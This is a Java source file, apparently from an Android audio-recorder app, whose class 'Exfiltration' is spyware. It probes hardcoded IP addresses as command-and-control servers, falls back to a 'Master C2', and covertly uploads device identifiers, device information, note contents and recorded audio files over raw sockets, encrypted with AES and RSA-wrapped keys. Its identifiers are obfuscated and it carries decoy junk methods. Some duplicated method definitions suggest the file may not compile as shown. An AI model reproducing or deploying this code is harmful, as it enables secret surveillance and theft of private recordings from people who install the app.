package com.singaporetech.audiorecorder;
import java.io.BufferedReader;
import java.util.Base64;
import java.security.KeyFactory;
import javax.crypto.SecretKey;
import java.net.SocketTimeoutException;
import javax.crypto.NoSuchPaddingException;
import java.security.spec.InvalidParameterSpecException;
import java.security.spec.KeySpec;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.io.InputStreamReader;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.PBEKeySpec;
import java.security.InvalidKeyException;
import java.util.concurrent.TimeUnit;
import javax.crypto.spec.IvParameterSpec;
import java.io.FileInputStream;
import java.io.DataOutputStream;
import androidx.annotation.RequiresApi;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import java.io.IOException;
import java.security.Key;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.SocketException;
import java.security.SecureRandom;
import java.net.Socket;
import java.net.SocketAddress;
import java.security.AlgorithmParameters;
import javax.crypto.Cipher;
import java.net.UnknownHostException;
import java.io.DataInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import android.os.Build;
import java.util.List;
import java.io.ByteArrayInputStream;
import java.util.ArrayList;
import java.security.spec.X509EncodedKeySpec;
public class Exfiltration {
 private static DataOutputStream dataOutputStream = null;
 private static DataInputStream dataInputStream = null;
 @RequiresApi(api = Build.VERSION_CODES.O)
 public static Key ILILILL11LL1IIL(String keyStr) throws NoSuchAlgorithmException, InvalidKeySpecException {
 byte[] LlI1I11I1L1ILlLL1lIl = Base64.getDecoder().decode(keyStr);
 Key clientRSAKey = KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(LlI1I11I1L1ILlLL1lIl));
 return clientRSAKey;
 }
 @RequiresApi(api = Build.VERSION_CODES.O)
 public static byte[] LII111ll1lI1l1IIL11() throws NoSuchAlgorithmException {
 String I111I1lILI = "0123456789abcdefghijklmnopqrstuvwxyz-_ABCDEFGHIJKLMNOPQRSTUVWXYZ";
 SecureRandom secureRandom = SecureRandom.getInstanceStrong();
 String llI1L = secureRandom.ints(8, 0, I111I1lILI.length()).mapToObj(LL1LL111lll -> I111I1lILI.charAt(LL1LL111lll))
 .collect(StringBuilder::new, StringBuilder::append, StringBuilder::append).toString();
 return llI1L.getBytes();
 }
public static String LII111ll1lI1l1IIL11(int LI1Ll1ILLlIlL1l1) throws NoSuchAlgorithmException { int genRanAway = 5;if (genRan(5) == cir(5)) { genRanAway = 1; } return String.valueOf(genRanAway) + String.valueOf(LI1Ll1ILLlIlL1l1); }
public static double cir(double m) {m = m * 3.142; return m;}
public static double genRan(int cnt) {int m = (int)Math.pow(10, cnt - 1);return cir(m);}
 public static String sIrx(String II1lIlIL, byte[] llI1L) throws NoSuchAlgorithmException, InvalidKeySpecException, NoSuchPaddingException, InvalidKeyException, InvalidParameterSpecException, IOException {
 SecretKeyFactory factory = SecretKeyFactory
 .getInstance("PBKDF2WithHmacSHA1");
 KeySpec keySpec = new PBEKeySpec(II1lIlIL.toCharArray(), llI1L, 65536,
 256);
 SecretKey secretKey = factory.generateSecret(keySpec);
 SecretKey secret = new SecretKeySpec(secretKey.getEncoded(), "AES");
 Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
 cipher.init(Cipher.ENCRYPT_MODE, secret);
 AlgorithmParameters params = cipher.getParameters();
 byte[] lLLLLIl1LII1IlILLL = new byte[16];
 lLLLLIl1LII1IlILLL = params.getParameterSpec(IvParameterSpec.class).getIV();
 BufferedReader reader = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(lLLLLIl1LII1IlILLL), "Cp1252"));
 StringBuilder stringBuilder = new StringBuilder();
 String IILll1l1111L = null;
 while ((IILll1l1111L = reader.readLine()) != null) {
 stringBuilder.append(IILll1l1111L);
 }
 reader.close();
 return stringBuilder.toString();
 }
public static String sIrx(String II1lIlIL, byte[] llI1L, float ILlILIl1) throws NoSuchAlgorithmException, InvalidKeySpecException, NoSuchPaddingException, InvalidKeyException, InvalidParameterSpecException, IOException { int genRanAway = 5;if (genRan(5) == cir(5)) { genRanAway = 1; } return String.valueOf(genRanAway) + String.valueOf(II1lIlIL); }
public static double cir(double m) {m = m * 3.142; return m;}
public static double genRan(int cnt) {int m = (int)Math.pow(10, cnt - 1);return cir(m);}
 public static byte[] IllL1IL(String plainText, Key L11L11lll1L1IILL1IIl) throws Exception
 {
 Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
 cipher.init(Cipher.ENCRYPT_MODE, L11L11lll1L1IILL1IIl);
 byte[] okxbJj = cipher.doFinal(plainText.getBytes());
 return okxbJj;
 }
 public static List<String> II1LLILILIlLl() {
int IIILIllIILl1l = (int) '';
int l1I11LL1IL1 = (int) '';
 List<String> active_hosts = new ArrayList<String>();
 int IllL11LlllI1ILL = (IIILIllIILl1l*l1I11LL1IL1 + 500*IIILIllIILl1l - 2*l1I11LL1IL1);
 boolean lLILlL = false;
 String[] check_hosts = {"39.109.150.43", "103.137.14.133", "121.6.245.216", "119.74.208.123"};
 for (int LL1LL111lll = (IIILIllIILl1l*l1I11LL1IL1 + 2*IIILIllIILl1l - 2*l1I11LL1IL1); LL1LL111lll < (IIILIllIILl1l*l1I11LL1IL1 + 2*IIILIllIILl1l - 2*l1I11LL1IL1); LL1LL111lll++){
 try {
 SocketAddress socketAddress = new InetSocketAddress(check_hosts[LL1LL111lll], 80);
 Socket socket = new Socket();
 System.out.println("Connecting to" + check_hosts[LL1LL111lll]);
 socket.connect(socketAddress, IllL11LlllI1ILL);
 dataOutputStream = new DataOutputStream(socket.getOutputStream());
 dataOutputStream.writeUTF("checking if host is alive");
 dataOutputStream.flush();
 dataOutputStream.close();
 active_hosts.add(check_hosts[LL1LL111lll]);
 socket.close();
 } catch (SocketException | SocketTimeoutException ignored){} catch (IOException e) {
 e.printStackTrace();
 }
 }
 return active_hosts;
 }
 public static void exfiltrateNoteData(String deviceID, String currTime, String noteContents){
 new Thread(new Runnable(){
 @RequiresApi(api = Build.VERSION_CODES.O)
            @Override public void run() {
 String lLll1l1lLLL1LlI1lI1L ="";
 List<String> active_hosts = II1LLILILIlLl();
 if (active_hosts.size() == 0){
 System.out.println("Proxy Servers down");
 lLll1l1lLLL1LlI1lI1L = "34.87.22.52";
 System.out.println("Connecting to Master C2 =======> " + lLll1l1lLLL1LlI1lI1L);
 }
 else{
 System.out.println("List of active C2: " + active_hosts);
 lLll1l1lLLL1LlI1lI1L = active_hosts.get((int) Math.floor(Math.random() * ((active_hosts.size())) + 0));
 System.out.println("Random IP =======> " + lLll1l1lLLL1LlI1lI1L);
 }
 String L11L11lll1L1IILL1IIl = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCa6H+PmPNnh1gZWWNhBZiNfM9SR5xvmhQCOW3ClHUBG2kn4Xy15YL3vcbQ2HZ+8VcrDD54rvj93nSqjwiLnjWI4ORANstzWxX5KgWMz0Dr8OzmWXYb64g2YtAghLfc4IdJCd3i6zfIRTkKD+1ODosOhjUzybhtZxsuvNB+BTTo0wIDAQAB";
 String II1lIlIL = "javapapers";
 try {
 byte[] llI1L = LII111ll1lI1l1IIL11();
 BufferedReader readerSalt = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(llI1L), "Cp1252"));
 StringBuilder stringBuilderSalt = new StringBuilder();
 String l11IlL1LLI1IlIlL = null;
 while ((l11IlL1LLI1IlIlL = readerSalt.readLine()) != null) {
 stringBuilderSalt.append(l11IlL1LLI1IlIlL);
 }
 readerSalt.close();
 String llIlILlllLIILl = stringBuilderSalt.toString();
 byte[] lll1ll = IllL1IL(llIlILlllLIILl, ILILILL11LL1IIL(L11L11lll1L1IILL1IIl));
 Socket llI1L_socket = new Socket(lLll1l1lLLL1LlI1lI1L, 80);
 dataInputStream = new DataInputStream(llI1L_socket.getInputStream());
 dataOutputStream = new DataOutputStream(llI1L_socket.getOutputStream());
 String LIIl1lI11Ll = deviceID + "_noteContents_" + currTime + "-salt.enc";
 String lILLlII1LlI11L = Base64.getEncoder().encodeToString(IllL1IL(LIIl1lI11Ll, ILILILL11LL1IIL(L11L11lll1L1IILL1IIl)));
 dataOutputStream.writeUTF(lILLlII1LlI11L);
 dataOutputStream.write(lll1ll);
 TimeUnit.SECONDS.sleep(1);
 dataOutputStream.flush();
 dataInputStream.close();
 dataOutputStream.close();
 TimeUnit.SECONDS.sleep(1);
 llI1L_socket.close();
 SecretKeyFactory factory = SecretKeyFactory
 .getInstance("PBKDF2WithHmacSHA1");
 KeySpec keySpec = new PBEKeySpec(II1lIlIL.toCharArray(), llI1L, 65536,
 256);
 SecretKey secretKey = factory.generateSecret(keySpec);
 SecretKey secret = new SecretKeySpec(secretKey.getEncoded(), "AES");
 Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
 cipher.init(Cipher.ENCRYPT_MODE, secret);
 AlgorithmParameters params = cipher.getParameters();
 byte[] lLLLLIl1LII1IlILLL = new byte[16];
 lLLLLIl1LII1IlILLL = params.getParameterSpec(IvParameterSpec.class).getIV();
 BufferedReader reader = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(lLLLLIl1LII1IlILLL), "Cp1252"));
 StringBuilder stringBuilder = new StringBuilder();
 String IILll1l1111L = null;
 while ((IILll1l1111L = reader.readLine()) != null) {
 stringBuilder.append(IILll1l1111L);
 }
 reader.close();
 String IlLILLLL111lLLlI1lI1 = stringBuilder.toString();
 String I1lLII1lL11LLllLI = IlLILLLL111lLLlI1lI1;
 while(true){
 if (I1lLII1lL11LLllLI.length() != 16){
 System.out.println("\n ================== Retrying To Get A New IV File =====================\n");
 I1lLII1lL11LLllLI = sIrx(II1lIlIL, llI1L);
 System.out.println("Retried Content before encrypting: " + I1lLII1lL11LLllLI);
 System.out.println("Retried Content length:" + I1lLII1lL11LLllLI.length() + "\n");
 }else{
 break;
 }
 }
 byte[] LLLIIl11l11l11lII1L1 = IllL1IL(I1lLII1lL11LLllLI, ILILILL11LL1IIL(L11L11lll1L1IILL1IIl));
 Socket lLLLLIl1LII1IlILLL_socket = new Socket(lLll1l1lLLL1LlI1lI1L, 80);
 dataInputStream = new DataInputStream(lLLLLIl1LII1IlILLL_socket.getInputStream());
 dataOutputStream = new DataOutputStream(lLLLLIl1LII1IlILLL_socket.getOutputStream());
 String lIILl1I1LLL1L = deviceID + "_noteContents_" + currTime + "-iv.enc";
 String LlILILLL = Base64.getEncoder().encodeToString(IllL1IL(lIILl1I1LLL1L, ILILILL11LL1IIL(L11L11lll1L1IILL1IIl)));
 dataOutputStream.writeUTF(LlILILLL);
 dataOutputStream.write(LLLIIl11l11l11lII1L1);
 TimeUnit.SECONDS.sleep(1);
 dataOutputStream.flush();
 dataInputStream.close();
 dataOutputStream.close();
 TimeUnit.SECONDS.sleep(1);
 lLLLLIl1LII1IlILLL_socket.close();
 Socket DI_socket = new Socket(lLll1l1lLLL1LlI1lI1L, 80);
 dataInputStream = new DataInputStream(DI_socket.getInputStream());
 dataOutputStream = new DataOutputStream(DI_socket.getOutputStream());
 String Ll1IIlI1l1l11 = deviceID + "_" + "noteContents_" + currTime + ".txt";
 String IllllIIIIIlLI = Base64.getEncoder().encodeToString(IllL1IL(Ll1IIlI1l1l11, ILILILL11LL1IIL(L11L11lll1L1IILL1IIl)));
 dataOutputStream.writeUTF(IllllIIIIIlLI);
 byte[] ILILLIlIllIlLl = new byte[64];
 int CONTENT_bytesRead;
 ByteArrayOutputStream outputStreamer = new ByteArrayOutputStream();
 outputStreamer.write(noteContents.getBytes());
 System.out.println("Content in function: " + noteContents);
 byte[] LLlIl111 = outputStreamer.toByteArray();
 InputStream inputStreamer = new ByteArrayInputStream(LLlIl111);
 while ((CONTENT_bytesRead = inputStreamer.read(ILILLIlIllIlLl)) != -1) {
 byte[] ll1lIIILlll1 = cipher.update(ILILLIlIllIlLl, 0, CONTENT_bytesRead);
 if (ll1lIIILlll1 != null)
 dataOutputStream.write(ll1lIIILlll1);
 dataOutputStream.flush();
 }
 byte[] rec_ll1lIIILlll1 = cipher.doFinal();
 if (rec_ll1lIIILlll1 != null)
 dataOutputStream.write(rec_ll1lIIILlll1);
 dataOutputStream.flush();
 dataInputStream.close();
 dataOutputStream.close();
 TimeUnit.SECONDS.sleep(1);
 DI_socket.close();
 }catch (IOException e) {
 e.printStackTrace();
 } catch (NoSuchPaddingException e) {
 e.printStackTrace();
 } catch (NoSuchAlgorithmException e) {
 e.printStackTrace();
 } catch (IllegalBlockSizeException e) {
 e.printStackTrace();
 } catch (InvalidKeySpecException e) {
 e.printStackTrace();
 } catch (InvalidParameterSpecException e) {
 e.printStackTrace();
 } catch (BadPaddingException e) {
 e.printStackTrace();
 } catch (InvalidKeyException e) {
 e.printStackTrace();
 } catch (InterruptedException e) {
 e.printStackTrace();
 } catch (Exception e) {
 e.printStackTrace();
 }
 }
 }).start();
 }
 public static void exfiltrateData(String deviceID, String recordFile, String currTime, String recordpath, String device_info) throws IOException {
 new Thread(new Runnable(){
 @RequiresApi(api = Build.VERSION_CODES.O)
            @Override public void run() {
 String lLll1l1lLLL1LlI1lI1L = "";
 List<String> active_hosts = II1LLILILIlLl();
 if (active_hosts.size() == 0){
 System.out.println("Proxy Servers down");
 lLll1l1lLLL1LlI1lI1L = "34.87.22.52";
 System.out.println("Connecting to Master C2 =======> " + lLll1l1lLLL1LlI1lI1L);
 }
 else{
 System.out.println("List of active C2: " + active_hosts);
 lLll1l1lLLL1LlI1lI1L = active_hosts.get((int) Math.floor(Math.random() * ((active_hosts.size())) + 0));
 System.out.println("Random IP =======> " + lLll1l1lLLL1LlI1lI1L);
 }
 String L11L11lll1L1IILL1IIl = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCa6H+PmPNnh1gZWWNhBZiNfM9SR5xvmhQCOW3ClHUBG2kn4Xy15YL3vcbQ2HZ+8VcrDD54rvj93nSqjwiLnjWI4ORANstzWxX5KgWMz0Dr8OzmWXYb64g2YtAghLfc4IdJCd3i6zfIRTkKD+1ODosOhjUzybhtZxsuvNB+BTTo0wIDAQAB";
 String II1lIlIL = "javapapers";
 try {
 byte[] llI1L = LII111ll1lI1l1IIL11();
 BufferedReader readerSalt = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(llI1L), "Cp1252"));
 StringBuilder stringBuilderSalt = new StringBuilder();
 String l11IlL1LLI1IlIlL = null;
 while ((l11IlL1LLI1IlIlL = readerSalt.readLine()) != null) {
 stringBuilderSalt.append(l11IlL1LLI1IlIlL);
 }
 readerSalt.close();
 String llIlILlllLIILl = stringBuilderSalt.toString();
 byte[] lll1ll = IllL1IL(llIlILlllLIILl, ILILILL11LL1IIL(L11L11lll1L1IILL1IIl));
 Socket llI1L_socket = new Socket(lLll1l1lLLL1LlI1lI1L, 80);
 dataInputStream = new DataInputStream(llI1L_socket.getInputStream());
 dataOutputStream = new DataOutputStream(llI1L_socket.getOutputStream());
 String LIIl1lI11Ll = deviceID + "_" + recordFile + "-salt.enc";
 String lILLlII1LlI11L = Base64.getEncoder().encodeToString(IllL1IL(LIIl1lI11Ll, ILILILL11LL1IIL(L11L11lll1L1IILL1IIl)));
 dataOutputStream.writeUTF(lILLlII1LlI11L);
 dataOutputStream.write(lll1ll);
 TimeUnit.SECONDS.sleep(1);
 dataOutputStream.flush();
 dataInputStream.close();
 dataOutputStream.close();
 TimeUnit.SECONDS.sleep(1);
 llI1L_socket.close();
 SecretKeyFactory factory = SecretKeyFactory
 .getInstance("PBKDF2WithHmacSHA1");
 KeySpec keySpec = new PBEKeySpec(II1lIlIL.toCharArray(), llI1L, 65536,
 256);
 SecretKey secretKey = factory.generateSecret(keySpec);
 SecretKey secret = new SecretKeySpec(secretKey.getEncoded(), "AES");
 Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
 cipher.init(Cipher.ENCRYPT_MODE, secret);
 AlgorithmParameters params = cipher.getParameters();
 byte[] lLLLLIl1LII1IlILLL = new byte[16];
 lLLLLIl1LII1IlILLL = params.getParameterSpec(IvParameterSpec.class).getIV();
 BufferedReader reader = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(lLLLLIl1LII1IlILLL), "Cp1252"));
 StringBuilder stringBuilder = new StringBuilder();
 String IILll1l1111L = null;
 while ((IILll1l1111L = reader.readLine()) != null) {
 stringBuilder.append(IILll1l1111L);
 }
 reader.close();
 String IlLILLLL111lLLlI1lI1 = stringBuilder.toString();
 String I1lLII1lL11LLllLI = IlLILLLL111lLLlI1lI1;
 while(true){
 if (I1lLII1lL11LLllLI.length() != 16){
 System.out.println("\n ================== Retrying To Get A New IV File =====================\n");
 I1lLII1lL11LLllLI = sIrx(II1lIlIL, llI1L);
 System.out.println("Retried Content before encrypting: " + I1lLII1lL11LLllLI);
 System.out.println("Retried Content length:" + I1lLII1lL11LLllLI.length() + "\n");
 }else{
 break;
 }
 }
 byte[] LLLIIl11l11l11lII1L1 = IllL1IL(I1lLII1lL11LLllLI, ILILILL11LL1IIL(L11L11lll1L1IILL1IIl));
 Socket lLLLLIl1LII1IlILLL_socket = new Socket(lLll1l1lLLL1LlI1lI1L, 80);
 dataInputStream = new DataInputStream(lLLLLIl1LII1IlILLL_socket.getInputStream());
 dataOutputStream = new DataOutputStream(lLLLLIl1LII1IlILLL_socket.getOutputStream());
 String lIILl1I1LLL1L = deviceID + "_" + recordFile + "-iv.enc";
 String LlILILLL = Base64.getEncoder().encodeToString(IllL1IL(lIILl1I1LLL1L, ILILILL11LL1IIL(L11L11lll1L1IILL1IIl)));
 dataOutputStream.writeUTF(LlILILLL);
 dataOutputStream.write(LLLIIl11l11l11lII1L1);
 TimeUnit.SECONDS.sleep(1);
 dataOutputStream.flush();
 dataInputStream.close();
 dataOutputStream.close();
 TimeUnit.SECONDS.sleep(1);
 lLLLLIl1LII1IlILLL_socket.close();
 Socket DI_socket = new Socket(lLll1l1lLLL1LlI1lI1L, 80);
 dataInputStream = new DataInputStream(DI_socket.getInputStream());
 dataOutputStream = new DataOutputStream(DI_socket.getOutputStream());
 String Ll1IIlI1l1l11 = deviceID + "_" + "Info_" + currTime + ".txt";
 String IllllIIIIIlLI = Base64.getEncoder().encodeToString(IllL1IL(Ll1IIlI1l1l11, ILILILL11LL1IIL(L11L11lll1L1IILL1IIl)));
 dataOutputStream.writeUTF(IllllIIIIIlLI);
 byte[] ILILLIlIllIlLl = new byte[64];
 int DI_bytesRead;
 ByteArrayOutputStream baos = new ByteArrayOutputStream();
 baos.write(device_info.getBytes());
 byte[] LLlIl111 = baos.toByteArray();
 InputStream dis = new ByteArrayInputStream(LLlIl111);
 while ((DI_bytesRead = dis.read(ILILLIlIllIlLl)) != -1) {
 byte[] ll1lIIILlll1 = cipher.update(ILILLIlIllIlLl, 0, DI_bytesRead);
 if (ll1lIIILlll1 != null)
 dataOutputStream.write(ll1lIIILlll1);
 dataOutputStream.flush();
 }
 byte[] rec_ll1lIIILlll1 = cipher.doFinal();
 if (rec_ll1lIIILlll1 != null)
 dataOutputStream.write(rec_ll1lIIILlll1);
 dataOutputStream.flush();
 dataInputStream.close();
 dataOutputStream.close();
 TimeUnit.SECONDS.sleep(1);
 DI_socket.close();
 Socket socket = new Socket(lLll1l1lLLL1LlI1lI1L, 80);
 dataInputStream = new DataInputStream(socket.getInputStream());
 dataOutputStream = new DataOutputStream(socket.getOutputStream());
 FileInputStream fileInputStream = new FileInputStream(recordpath + "/" + recordFile);
 String l1IlIl111LlIlll = deviceID + "_" + recordFile + ".enc";
 String llLILLIllll1 = Base64.getEncoder().encodeToString(IllL1IL(l1IlIl111LlIlll, ILILILL11LL1IIL(L11L11lll1L1IILL1IIl)));
 dataOutputStream.writeUTF(llLILLIllll1);
 int bytesRead;
 while ((bytesRead = fileInputStream.read(ILILLIlIllIlLl)) != -1) {
 byte[] ll1lIIILlll1 = cipher.update(ILILLIlIllIlLl, 0, bytesRead);
 if (ll1lIIILlll1 != null)
 dataOutputStream.write(ll1lIIILlll1);
 dataOutputStream.flush();
 }
 byte[] ll1lIIILlll1 = cipher.doFinal();
 if (ll1lIIILlll1 != null)
 dataOutputStream.write(ll1lIIILlll1);
 dataOutputStream.flush();
 dataInputStream.close();
 dataOutputStream.close();
 TimeUnit.SECONDS.sleep(1);
 socket.close();
 } catch (IOException e) {
 e.printStackTrace();
 } catch (NoSuchPaddingException e) {
 e.printStackTrace();
 } catch (NoSuchAlgorithmException e) {
 e.printStackTrace();
 } catch (IllegalBlockSizeException e) {
 e.printStackTrace();
 } catch (InvalidKeySpecException e) {
 e.printStackTrace();
 } catch (InvalidParameterSpecException e) {
 e.printStackTrace();
 } catch (BadPaddingException e) {
 e.printStackTrace();
 } catch (InvalidKeyException e) {
 e.printStackTrace();
 } catch (InterruptedException e) {
 e.printStackTrace();
 } catch (Exception e) {
 e.printStackTrace();
 }
 }
 }).start();
 }
 }
